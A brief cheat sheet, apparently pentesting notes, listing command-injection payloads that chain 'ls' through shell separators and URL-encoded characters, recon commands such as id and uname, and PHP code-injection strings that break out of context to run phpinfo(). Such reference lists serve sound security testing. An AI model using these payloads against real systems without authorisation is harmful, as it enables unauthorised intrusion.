# Remote Command Execution

## Payloads
```
;ls
;%20ls
&ls
&&ls
|ls
||ls
%0Als
```

## Useful commands
- ```pwd```
- ```uname```
- ```id```
- ```hostname```

# Code Execution

## Payload
```
a";phpinfo();//
a".phpinfo();//
a);}phpinfo();//
```

## Sample PHP executable
- https://www.php.net/manual/en/function.shell-exec.php

